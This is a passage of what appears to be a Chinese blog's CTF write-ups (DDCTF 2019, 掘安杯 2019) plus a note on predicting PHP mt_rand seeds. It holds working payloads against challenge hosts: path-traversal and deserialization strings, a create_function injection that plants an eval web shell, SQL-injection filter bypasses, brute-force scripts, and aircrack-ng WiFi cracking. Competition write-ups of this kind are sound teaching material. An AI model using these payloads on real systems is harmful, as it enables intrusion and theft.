$path=str_replace(&#39;..\\\\&#39;,&#39;&#39;,$path); return $path; } public function __destruct() { if(empty($this-&gt;path)) { exit(); }else{ $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) { exit(); } $this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;); } 发现这个path值 过滤了../可以进行双写绕过 于是构造Application类 &lt;?php class Application{ var $session_id = &#39;5c5d2e08abcb1f7f32228b19935a9fb5&#39;; var $ip_address = &#39;117.158.83.66&#39;; var $user_agent = &#39;Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:66.0)+Gecko/20100101+Firefox/66.0&#39;; var $user_data = &#39;&#39;; var $path = &#39;....//config/flag.txt&#39;; } $a = new Application(); $a = serialize($a); echo urlencode($a.md5(&#39;EzblrbNS&#39;.$a)); ?&gt; 得到flag DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j} Upload-IMG打开页面发现是一个文件上传的题目 先随便传一个图片看一下 发现这个是需要经过二次渲染之后 还能找到 phpinfo() 这一串字符串 让我想到了 以前做过的 upload-labs的第十六关 二次渲染绕过 参考了当时讲课的时候的学长的博客 于是开始制作一个 能过绕过二次渲染的图片 首先保存一个 已经被渲染的图片 命名为 1.jpg 然后用脚本开始跑图片其中关键字改为phpinfo()就可以了 php phpinfo.php 1.jpg 制作完成一张 合格的图片 然后上传 就会得到flag： 大吉大利，今晚吃鸡打开页面是一个 类似吃鸡模式的游戏 首先获得入场券，然后淘汰其他选手就能获得flag 首先购买入场券 通过抓包发现ticket_price=2000这个参数可以进行修改，但是只能改大不能改小，于是想到了php的整形溢出 令ticket_price=4294967296 就可以买到入场券 进入游戏 然后想到了利用python写脚本注册大量的用户 然后再把它们移除 脚本为： import re import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) id = open(&quot;1.txt&quot;, &quot;a&quot;) ticket = open(&quot;2.txt&quot;,&quot;a&quot;) for i in range(150): register_url = &quot;http://117.51.147.155:5050/ctf/api/register&quot; r = requests.session() register_playload = &quot;?name=chuddy1234chuddy123chuddy123chuddy123chuddy123&quot;+str(i)+&quot;&amp;password=123456789a&quot; # print register_playload s = r.get(url=register_url+register_playload) # print s.text tick_url = &quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&quot; tick = r.get(url=tick_url) a = tick.text bill_id = re.search(r&#39;id&quot;:&quot;(.*)&quot;,&quot;tick&#39;,a).group(1) # print bill_id pay_url = &quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&quot;+bill_id pay = r.get(url=pay_url) success = &#39;{&quot;code&quot;:200,&quot;data&quot;:[{&quot;your_id&quot;:75,&quot;your_ticket&quot;:&quot;4c529f4afa586f5d8e1e8bd89a6f28dd&quot;}],&quot;msg&quot;:&quot;\\u4ea4\\u6613\\u6210\\u529f&quot;}&#39; pay_id1 = re.search(r&#39;your_id&quot;:(.*),&quot;you&#39;,pay.text).group(1) pay_ticket1 = re.search(r&#39;your_ticket&quot;:&quot;(.*)&quot;}],&quot;msg&quot;&#39;,pay.text).group(1) print pay_id1 print pay_ticket1 id.write(pay_id1) id.write(&quot;\\n&quot;) ticket.write(pay_ticket1) ticket.write(&quot;\\n&quot;) 这个可以获得大量的注册的用户，再用bp跑一下 将他们清除掉就可以获得flag了 跑完脚本就能得到flag了 flag: DDCTF{chiken_dinner_hyMCX[n47Fx)}","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"php伪随机数","slug":"php伪随机数","date":"2019-04-20T08:18:10.000Z","updated":"2019-06-13T10:58:12.840Z","comments":true,"path":"2019/04/20/php伪随机数/","link":"","permalink":"http://yoursite.com/2019/04/20/php伪随机数/","excerpt":"php伪随机数前言这一段遇到了一个关于伪随机数的题目，当时没有做出来，看完writeup之后，感觉很有意思，所以就记录下来","text":"php伪随机数前言这一段遇到了一个关于伪随机数的题目，当时没有做出来，看完writeup之后，感觉很有意思，所以就记录下来 php伪随机数漏洞php中重要的几个随机函数 rand() 不指定参数时，范围0-32767 mt_rand() 不指定参数时，范围0-2^32-1 srand() 给rand()函数播种 mt_srand() 给mt_srand()函数播种 php是基于C开发的，C中生成随机数时，需要自己去一个种子，相同的种子产生的随机数是相同的，php中也一样 自己的理解：mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。 所以，当种子一定时，接下来几次的随机数都是固定的 测试代码： &lt;?php mt_srand(1433223); echo mt_rand().&quot;&lt;br&gt;&quot;; echo mt_rand().&quot;&lt;br&gt;&quot;; echo mt_rand().&quot;&lt;br&gt;&quot;; echo mt_rand().&quot;&lt;br&gt;&quot;; echo mt_rand().&quot;&lt;br&gt;&quot;; ?&gt; 页面输出： 2068220702 2001673607 410303409 475448501 1250041484 发现随机种子 确定下来 无论怎么刷新 页面返回的一直是这几个随机数 同时我们应该注意，mt_srand()函数播种的时候，只有在第一次调用mt_rand()函数的时候才会使用。所以如果我们知道了第一次生成的随机数值，就可能爆破出随机数种子。 工具链接： php伪随机数 发现爆出了5个可能的种子通过验证可以知道那个是正确的种子 注意：如果不是第一次生成的随机数，爆出来的种子，不一定正确 在 php &gt; 4.2.0 的版本中，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已由 PHP 自动完成。php 中产生一系列的随机数时，只进行了一次播种，而不是每次调用 mt_rand() 都进行播种。","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"2019掘安杯writeup","slug":"掘安杯writeup","date":"2019-04-10T08:05:29.172Z","updated":"2019-09-09T12:31:52.609Z","comments":true,"path":"2019/04/10/掘安杯writeup/","link":"","permalink":"http://yoursite.com/2019/04/10/掘安杯writeup/","excerpt":"2019掘安杯writeupweb","text":"2019掘安杯writeupweb web签到题打开题目链接发现 点击之后是一个404页面 果断选择抓包 发现： 感觉像是base64编码 于是解码获得flag： jactf{jasafe110qweasdzxc} 下载下载打开链接发现下载了一个flag.txt 于是开始思考别的 查看源代码发现 &lt;html&gt; &lt;head&gt; &lt;title&gt;下载下载&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=&quot;?file=flag.txt&quot;&gt;下载flag文件&lt;/a&gt; &lt;!-- &lt;a href=&quot;flag.php&quot;&gt;flag&lt;/a&gt; --&gt; &lt;/body&gt; &lt;/html&gt; 于是尝试下载flag.php http://120.79.1.69:10002/?file=flag.php flag.php的内容为一种加密解密的方式 &lt;?php header(&#39;Content-Type: text/html; charset=utf-8&#39;); //网页编码 function encrypt($data, $key) { $key = md5 ( $key ); $x = 0; $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &lt; $len; $i ++) { if ($x == $l) { $x = 0; } $char .= $key {$x}; $x ++; } for($i = 0; $i &lt; $len; $i ++) { $str .= chr ( ord ( $data {$i} ) + (ord ( $char {$i} )) % 256 ); } return base64_encode ( $str ); } function decrypt($data, $key) { $key = md5 ( $key ); $x = 0; $data = base64_decode ( $data ); $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &lt; $len; $i ++) { if ($x == $l) { $x = 0; } $char .= substr ( $key, $x, 1 ); $x ++; } for($i = 0; $i &lt; $len; $i ++) { if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) { $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) ); } else { $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) ); } } return $str; } $key=&quot;MyCTF&quot;; $flag=&quot;o6lziae0xtaqoqCtmWqcaZuZfrd5pbI=&quot;;//encrypt($flag,$key) ?&gt; 只需在代码下面添加 echo decrypt($flag,$key); 运行就可以得到flag myCTF{cssohw456954GUEB} 猜密码题目暂时下架了 该网站已被黑打开页面发现网站被黑 于是用御剑扫到后门 shell.php 开始爆破管理员密码为 hack即可得到flag jactf{DWDASFASCASFAFASFNKAS} not_easy发现是个代码审计类的题目： &lt;?php error_reporting(0); if(isset($_GET[&#39;action&#39;])) { $action = $_GET[&#39;action&#39;]; } if(isset($_GET[&#39;action&#39;])){ $arg = $_GET[&#39;arg&#39;]; } if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)){ show_source(__FILE__); } else { $action($arg,&#39;&#39;); } 想到了匿名函数绕过 但是他这里有一个正则匹配的问题 看了别人的blog才知道 \\可以绕过这个 在PHP的命名空间默认为\\，所有的函数和类都在\\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 于是想到绕过方式： http://120.79.1.69:10006/?action=\\create_function&amp;arg=){}phpinfo();/* 于是可以构造一个木马： http://120.79.1.69:10006/?action=\\create_function&amp;arg=){}eval($_POST[&#39;chuddy&#39;]);/* 就可以得到flag： jactf{c795359da56ae38ec9132eaad24733fc} 曲折的人生打开页面发现了登陆框 发现可以联合注入 通过测试发现过滤了： 空格：用/*1*/绕过 union：双写绕过ununionion select: 双写绕过selselctect or：双写绕过oorr 于是开始爆值： 爆出username：goodboy_g-60Hellowor 登录的时候要注意，用户名中也存在一个or，所以也要进行双写绕过 admin&#39;ununionion/*1*/selecselectt/*1*/1,(selselectect/*1*/group_concat(username)/*1*/from/*1*/admin),3&#39;# 爆出password为 ajahas&amp;&amp;*44askldajaj admin&#39;ununionion/*1*/selecselectt/*1*/1,(selselectect/*1*/group_concat(passwoorrd)/*1*/from/*1*/admin),3&#39;# 接下来就是下面验证码的问题 需要用脚本来跑 #!/usr/bin/python #coding=utf-8 import re import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) data={ &#39;username&#39;:&#39;goodboy_g-60Hellowoorr&#39;, &#39;password&#39;:&#39;ajahas&amp;&amp;*44askldajaj&#39; } for i in range(100000000): s = requests.Session() url=&quot;http://120.79.1.69:10005/index.php&quot; r = s.post(url=url,data=data) match = re.search(r&quot;&lt;div class=&#39;rep&#39;&gt;.*&lt;/div&gt;&quot;,r.text).group(0) match = str(match) match = re.sub(&quot;&lt;div class=&#39;rep&#39;&gt;&quot;,&#39;&#39;,match) match = re.sub(&quot;&lt;/div&gt; &lt;/div&gt;&quot;,&#39;&#39;,match) match = re.sub(&quot;（&quot;,&#39;(&#39;,match) match = re.sub(&quot;）X&quot;,&#39;)*&#39;,match) match = re.sub(&quot;）/&quot;,&#39;)/&#39;,match) match = re.sub(&quot;）&quot;,&#39;)&#39;,match) match = eval(match) print match d = { &#39;username&#39;:&#39;goodboy_g-60Hellowoorr&#39;, &#39;password&#39;:&#39;ajahas&amp;&amp;*44askldajaj&#39;, &quot;code&quot;: match } r = s.post(url=url+&quot;?check&quot;,data=d) if &quot;验证码正确&quot; in r.text: print r.text break 跑出来了一个压缩包地址 和密码： 这里面有获取flag.zip的密码获取方式 Private Function getPassword(ByVal str As String) As String Dim reString As String Dim i As Integer i = 1 While (i &lt;= Len(str)) reString = reString &amp; Mid(str, i, 1) i = i + (i Mod 5) Wend getPassword = reString End Function Private Sub Command1_Click() Dim Dictionary As String Dictionary = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot; Dim password As String password = getPassword(Dictionary) Dim psw As String psw = Text1.Text If (psw = password) Then MsgBox &quot;The password is correct!&quot;, vbOKOnly, &quot;密码正确&quot; Text1.Text = &quot;Password for next pass : &quot; &amp; getPassword(password) Else MsgBox &quot;PasswordFail!&quot;, vbOKOnly, &quot;密码错误&quot; End If End Sub 写出解密脚本： str = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU&quot; print len(str) flag = &quot;&quot; flag1 = &quot;&quot; i =1 while i &lt;= len(str): flag += str[i-1:i] i = i + (i%5) i=1 while i &lt;= len(flag): flag1 += flag[i-1:i] i = i + (i%5) print flag1 密码为：VmH0wW3DZalBnmmSalV1SYSGRr1r3jVYcFrHWkUUlhljkFzCbXaEKyaVJymT1FlVTVskVWhGtonaGU2WWGhVXYol1WVI1F2odFuk 解压缩flag.zip之后发现图片打不开，用winhex打开发现flag flag{Good luck!} audit发现是代码审计 &lt;?php highlight_file(__FILE__); include(&#39;flag.php&#39;); $str1 = @$_GET[&#39;str1&#39;]; $str2 = @$_GET[&#39;str2&#39;]; $str3 = @$_GET[&#39;str3&#39;]; $str4 = @$_GET[&#39;str4&#39;]; $str5 = (string)@$_POST[&#39;str5&#39;]; $str6 = (string)@$_POST[&#39;str6&#39;]; $str7 = (string)@$_POST[&#39;str7&#39;]; if( $str1 == $str2 ){ die(&#39;str1 OR Sstr2 no no no&#39;); } if( md5($str1) != md5($str2) ){ die(&#39;step 1 fail&#39;); } if( $str3 == $str4 ){ die(&#39;str3 OR str4 no no no&#39;); } if ( md5($str3) !== md5($str4)){ die(&#39;step 2 fail&#39;); } if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 ){ die(&#39;str5 OR str6 OR str7 no no no&#39;); } if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7)){ die(&#39;step 3 fail&#39;); } if(!($_POST[&#39;a&#39;]) and !($_POST[&#39;b&#39;])) { echo &quot;come on!&quot;; die(); } $a = $_POST[&#39;a&#39;]; $b = $_POST[&#39;b&#39;]; $m = $_GET[&#39;m&#39;]; $n = $_GET[&#39;n&#39;]; if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) { echo &quot;a OR b fail!&quot;; die(); } if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) { echo &quot;m OR n fail&quot;; die(); } $str8 = hash(&#39;md5&#39;, $a, false); $str9 = strtr(hash(&#39;md5&#39;, $b, false), $m, $n); echo &quot;&lt;p&gt;str8 : $str8&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;str9 : $str9&lt;/p&gt;&quot;; if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6)) { echo &quot;You&#39;re great,give you flag:&quot;; echo $flag; } str1 OR Sstr2 no no no 第一步就是利用弱类型绕过。 第二步就是数组绕过。 str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4就可绕过 但是str5,str6,str7强行转为字符串，数组绕过的方法就行不通了只能用MD5强碰撞 str5 = open(&quot;./md5/out_test_000.txt&quot;,&quot;rb&quot;).read() str6 = open(&quot;./md5/out_test_001.txt&quot;,&quot;rb&quot;).read() str7 = open(&quot;./md5/out_test_002.txt&quot;,&quot;rb&quot;).read() 工具地址为：https://github.com/thereal1024/python-md5-collision 然后就是最后一层的了 需要传递四个参数a,b,m,n$a为大写字母，$b为数字、并且长度为6，$m和$n长度小于4$str8为$ahash加密后的值，$str9为$bhash加密后，把$m替换为$n,要求$str8== $str9。还是用的弱类型。a可以为：QNKCDZO如果$b为hash加密后0e开头，可以满足，长度为6不能满足，但是还有次替换，只需要把0e后不是数字的替换为数字就可以。 然后开始构造：脚本为： import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) url = &quot;http://120.79.1.69:10007/?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4&amp;m=dcb&amp;n=123&quot; str5 = open(&quot;./md5/out_test_000.txt&quot;,&quot;rb&quot;).read() str6 = open(&quot;./md5/out_test_001.txt&quot;,&quot;rb&quot;).read() str7 = open(&quot;./md5/out_test_002.txt&quot;,&quot;rb&quot;).read() data= { &#39;str5&#39;:str5, &#39;str6&#39;:str6, &#39;str7&#39;:str7, &#39;a&#39;:&#39;QNKCDZO&#39;, &#39;b&#39;:&#39;259987&#39; } s = requests.post(url=url,data=data) print s.text 得到flag： jactf{c795359da56ae38ec9132eaad24733fc} miscmisc签到关注公众号 获得flag jactf{051bb6f64e70cc8766d62c3ea008eaee} so_easy下载下来发现是个打不开的exe文件 于是放在winhex下 发现有点像base加密尝试了一下发现是base58加密 进行解密发现了像是图片转的base64 data:image/bmp;base64, 于是进行在线解密扫描二维码就能得到flag jactf{base58_base64_flag_very_easy} 这是什么玩意打开txt文件发现是一些有规律的字符串 =E4=BD=9B=E6=9B=B0=EF=BC=9A=E6=A2=B5=E5=83=A7=E5=A5=A2=E6=A5=9E=E5=A5=A2=E5=90=89=E8=8B=A5=E5=A5=A2=E4=B8=8D=E5=B8=9D=E5=86=A5=E5=A4=9C=E6=98=AF=E7=BC=BD=E6=9C=8B=E7=BC=BD=E7=9C=9F=E7=89=B9=E4=BF=B1=E4=B8=8A=E7=BD=B0=E8=83=BD=E7=9A=A4=E5=AE=A4=E9=98=BF=E8=AB=B3=E6=98=8E=E4=B8=80=E5=88=87=E5=91=90=E9=99=A4=E6=A2=B5=E5=A7=AA=E7=BC=BD=E5=A9=86=E5=91=90=E4=BA=A6=E5=8F=83=E4=BE=84=E5=91=BC=E7=9A=A4=E4=B8=96=E5=93=86=E7=89=B9=E5=93=86=E6=95=85=E5=8B=9D=E8=AB=B3=E7=88=8D=E8=AC=B9=E6=99=BA=E7=9A=A4=E5=8F=83=E5=AD=95=E9=80=9D=E8=AB=B3=E8=AC=B9=E6=BC=AB=E6=AD=BB=E5=8D=B3=E4=BE=84=E9=99=A4=E5=93=86=E9=80=9D=E4=BE=84=E6=98=AF=E5=A5=A2=E5=96=9D=E7=A4=99=E8=B1=86=E8=AB=B3=E6=A5=9E=E7=84=A1=E4=BF=B1=E8=80=85=E5=93=86=E5=BA=A6=E8=80=85=E3=80=82=E8=AB=B3=E7=9C=9F=E5=86=A5=E8=A8=B6=E4=BE=84=E5=8B=9D=E7=AB=9F=E8=97=9D=E5=A5=A2=E4=B8=8D=E4=BC=8A=E7=9A=A4=E8=AC=B9=E6=B6=85=E5=AD=95=E7=84=A1=E4=BB=96=E7=BE=85=E5=A4=A7=E5=BE=97=E9=97=8D=E5=93=86=E5=96=9D=E8=80=B6=E5=83=A7=E7=84=A1=E7=BE=AF=E6=BB=85=E9=99=A4=E5=88=A9=E7=BC=BD=E5=A4=9A=E6=A2=B5=E5=A4=B7=E6=A2=B5=E6=A0=97=E7=BC=BD=E8=80=85=E5=AD=95=E8=AB=B3=E7=9B=A7=E7=9A=A4=E4=B8=89=E7=BD=B0=E5=AF=AB=E8=80=81=E6=A2=B5=E8=80=B6=E5=AE=A4=E5=B8=9D=E6=A2=B5=E5=AF=AB=E7=BE=AF=E6=95=B8=E6=A2=B5=E7=9B=A1=E4=BE=84=E6=A0=97=E4=BE=84=E8=97=90=E4=BF=B1=E4=B8=96=E8=AB=B3=E4=B8=8A=E8=AB=B3=E5=A7=AA=E6=95=B8=E5=AE=A4=E5=A9=86=E7=BD=B0=E6=A7=83=E5=A5=A2=E8=A8=B6=E5=93=86=E5=A4=9A=E9=80=9D=E8=97=90=E9=81=93=E6=A2=B5=E6=A5=9E=E6=A2=B5=E5=8D=97=E4=BE=84=E8=BF=A6=E5=91=90=E7=9F=A5=E6=9C=8B=E6=A5=9E=E4=BE=84=E9=9B=A2=E5=91=90=E6=B2=99=E5=91=90=E6=99=BA=E9=81=AE=E5=A4=A7=E5=AE=A4=E7=A5=9E=E5=86=A5=E8=BC=B8=E6=AE=BF=E7=BC=BD=E6=A7=83=E6=A2=B5=E6=80=9B=E6=81=90=E8=88=8D=E7=9F=A5=E7=9A=A4=E8=BF=A6=E5=A5=A2=E8=88=AC=E8=AB=B3=E7=88=8D=E5=AF=AB=E6=BC=AB=E4=BC=8A=E4=BF=B1=E6=A0=97=E5=93=86=E4=BB=96=E4=BA=A6=E7=BC=BD=E6=A5=9E=E6=80=9B=E5=86=A5=E5=91=BC=E5=88=87=E4=BF=B1=E8=8F=A9=E8=88=8D=E5=91=90=E5=AF=A6=E6=A0=97=E5=A5=A2=E6=B3=A2=E6=91=A9=E8=AB=B3=E9=81=93=E7=BC=BD=E7=91=9F=E5=93=86=E5=AF=A6=E7=9A=A4=E7=88=8D=E5=8B=9D=E8=96=A9=E7=BD=B0=E8=AB=B8=E5=A5=A2=E8=88=AC=E8=AB=A6=E7=BD=B0=E6=98=8E=E7=BC=BD=E8=AB=A6=E5=B0=BC=E5=93=86=E6=A5=9E=E4=BD=9B=E4=BF=B1=E9=86=AF=E8=AB=B3=E6=BB=85=E5=BA=A6=E5=93=86=E6=89=80=E6=A7=83=E5=A7=AA=E9=BA=BC=E6=89=80=E6=81=90=E8=AB=B3=E4=BB=96=E4=BE=84=E5=AF=AB=E7=91=9F=E4=BE=84=E6=89=80=E5=BE=97=E9=9A=B8=E5=93=86=E9=97=8D=E5=91=90=E6=8F=90=E7=9B=A7=E5=86=A5=E5=92=92=E5=A5=A2=E6=9B=B0=E5=91=90=E6=B2=99=E6=80=AF=E8=88=AC=E5=8D=97=E6=80=AF=E5=9C=B0=E7=BC=BD=E5=96=9D=E5=86=A5=E6=83=B3=E5=91=90=E7=9B=A7=E7=BD=B0=E8=AC=B9=E5=91=BC=E8=B7=8B=E7=BC=BD=E4=B8=8A=E5=A8=91=E8=AB=A6=E6=AD=BB=E4=BE=84=E8=BF=A6 百度一波发现是 Quoted-printable编码 开始解码 解码获得一个佛曰 于是想到了 与佛论禅 社会主义核心价值观编码 解码获得flag flag为： jactf{hexin_yufo_qp} 你对我的网站做了什么这是一个流量包分析题，打开流量包直接追踪数据流 发现了php代码 关于一种加密方式 还有一个和flag有关的数据流 分析可知是通过对flag.txt的内容进行加密 绕后输出的 于是写出解密的方法 &lt;?php $str = &quot;eJxLy0lMrw6NTzPMS4n3TVWsBQAz4wXi&quot;; echo gzuncompress(base64_decode($str, 6)); ?&gt; 得到flag： flag{U_f1nd_Me!} 小梳子题目叫我们破解wifi密码，已知wifi密码是手机号，前六位是138364，那么就很好办，我们可以自己做一个字典，直接爆破就得到了。 首先使用kali工具生成我们想要的字典 crunch 11 11 -t 138364%%%%% -o/root/chuddy/test.txt 解析：11代表字典最小和最大位都是11位，%代表数字，-o为输出路径 然后开始爆破这个wifi aircrack-ng -w /root/chuddy/test.txt Tenda_D07D90-01.cap 输入对应的编号：1，然后就是开始爆破 得到flag： jactf{13836458932} 这不是真的图片打开是一个图片 分析无果 binwalk一下 发现里面有一个压缩包 但是foremost却不能分离出来 winhex打开文件 查找 14000000 发现压缩包的头 被改为了 ja66 改回之后 再进行分离 打开压缩包 发现需要输入密码 尝试ja66 打开了 发现好多个文件夹 每个文件夹里面都有一个字母 有这些字母组成flag 编写脚本 import base64 flag=&#39;&#39; for i in range(32): f=open(&#39;./subject/&#39;+str(i)+&#39;/&#39;+str(i)+&#39;.txt&#39;,&#39;r&#39;) flag+=f.read() print flag print base64.b64decode(flag) 得到flag： jactf{64se64_1s_50_c001} 该死的温柔这道题就是使用了隐写工具OutGuess，它是一种通用的隐写工具，可以插入将隐藏信息存入数据源的冗余位。 安装工具kali终端命令： git clone https://github.com/crorvick/outguess 下载之后双击打开文件夹 输入命令 ./configure&amp;&amp; make &amp;&amp; make install 即可安装成功 查看这个图片的属性，发现备注有个guess 这就是要工具解密的密码然后构造命令 root@kali:~/chuddy/ctf/jactf/# outguess -k &quot;guess&quot; -r flag.jpg chuddy.txt Reading flag.jpg.... Extracting usable bits: 11538 bits Steg retrieve: seed: 206, len: 33 得到flag jactf{jactf_guess_steganography} 怀疑人生打开发现是三个文件 第一个文件是一个压缩包 需要密码才能打开 于是想到用工具去跑 跑出来密码为 password 打开发现时一串字母 用base64解码得到第一部分的flag flag{hacker 第二个文件是一个图片使用binwalk分析这个图片 发现隐藏的压缩包 foremost分离 打开压缩包 发现需要密码 用winhex打开发现时压缩包伪加密 把全局伪加密 01 00 ，改为00 00后保存 解压得到了一个txt文件 打开后发现是有 .?!组成的 想到了ook解密 ook解密 解密获得字符串 3oD54e 用base58解密获得第二部分的flag misc 第三个文件像是一个二维码 使用二维码识别工具进行识别 得到最后一部分的flag 12580} 三部分拼接在一起结构成了flag flag{hackermisc12580} CRYPTO签到题发现了一串字符串 像十六进制 #coding:utf-8 import binascii str = &quot;6A616374667B6865785F69735F656173797D&quot; print binascii.a2b_hex(str) 得到flag jactf{hex_is_easy} 罗马帝国的奠基者给了一些奇怪的字符串 h^_o`[pZi^i` 这和jactf前五个字符的ascii码值相差2，3，4，5，6 编写脚本 str = &quot;h^_o`[pZi^i`&quot; flag = &quot;&quot; c=2 for i in range(len(str)): flag += chr(ord(str[i])+c) c=c+1 print flag 得到flag： jactf{bxcsium} 贝斯家族三英战群魔看到这个题目就这到和basae解码有关 打开txt文件是一长串的字符串 对其进行base16，base32，base64循环解码 就能得到flag jactf{4(b64_32_16)} 绝密文件打开文件 作为我潜伏在宝岛地下工作者小菜截获了一段绝密的情报，具体如下： WzI2NDAzMjMxMEwsIDQ5NTA2MzczNDFMLCA0MTg5MTM3MjM1TCwgMzUwMzY3NTkwNkwsIDExOTMyNzJMLCAzNzQ1MzA5NjhMLCA1MTg5MjgxNTMxTCwgMjUxNDIwMDI3MkwsIDQ0NTQzMDU1ODFMLCA2NDEwNzg1OTdMLCA0Mzk1OTMxNjU5TCwgMjcxNjQyNjU5OUwsIDQzNzUzOTE5NEwsIDM0NDgwMTM1OTZMLCAzMDcyMDcyMDlMLCA0NzUwODIwNjA2TCwgMzI1MDQwNzk5M0wsIDg1MzkwNTIwOUwsIDIxMDk3OTExNTlMLCAyNzE2NDI2NTk5TCwgMjEwNzg5OTU1NEwsIDQzOTU5MzE2NTlMLCAyNzk0Mzg0NTk4TCwgMjEwOTc5MTE1OUwsIDUyOTc3NzkwOTRMLCAxNDYwODc0Mjg2TCwgMTQ2MDg3NDI4NkwsIDc5NDkzMTY3OUwsIDc5NDkzMTY3OUwsIDU0NDcwNTE2MjJMLCA4NTM5MDUyMDlMLCAzMTk4MzQwMjE4TCwgMTE5MzI3MkwsIDE5MTIzMjMxMDFMLCA1Mjk3Nzc5MDk0TCwgMzA3MjA3MjA5TCwgMzIzMTU3MjYwOEwsIDMxOTgzNDAyMThMLCA1MTg5MjgxNTMxTCwgNTI3ODg5NTQ4TCwgNDk1MDYzNzM0MUwsIDI4MzkzNjY4MDVMLCAxMTE2NDU3MzU0TCwgNTI3ODg5NTQ4TCwgNTI5Nzc3OTA5NEwsIDMyNTA0MDc5OTNMLCA0NDU0MzA1NTgxTCwgNjUxMDM5MkwsIDMyNTA0MDc5OTNMLCAxNDYwODc0Mjg2TCwgMTA1OTAzNTEyOUwsIDMyMDAzNTk2MTJMLCA4NTM5MDUyMDlMLCAzMDcyMDcyMDlMLCAxNTY3NzkxMDFMLCAyMTQ1MzAxMzI4TCwgNTI3ODg5NTQ4TCwgMTA1OTAzNTEyOUwsIDU0NjgwMjUwNzJMLCAzNDQ4MDEzNTk2TCwgMjEwNzg5OTU1NEwsIDQxODkxMzcyMzVMLCAzNTAzNjc1OTA2TCwgMjY1MzQzNjExM0x 而且小菜昨天偷听到了一部分关于情报的绝密资料，如下：N=5520780427 , e = 134257,你能帮小菜解出这段情报吗？ base64解密获得 [264032310L, 4950637341L, 4189137235L, 3503675906L, 1193272L, 374530968L, 5189281531L, 2514200272L, 4454305581L, 641078597L, 4395931659L, 2716426599L, 437539194L, 3448013596L, 307207209L, 4750820606L, 3250407993L, 853905209L, 2109791159L, 2716426599L, 2107899554L, 4395931659L, 2794384598L, 2109791159L, 5297779094L, 1460874286L, 1460874286L, 794931679L, 794931679L, 5447051622L, 853905209L, 3198340218L, 1193272L, 1912323101L, 5297779094L, 307207209L, 3231572608L, 3198340218L, 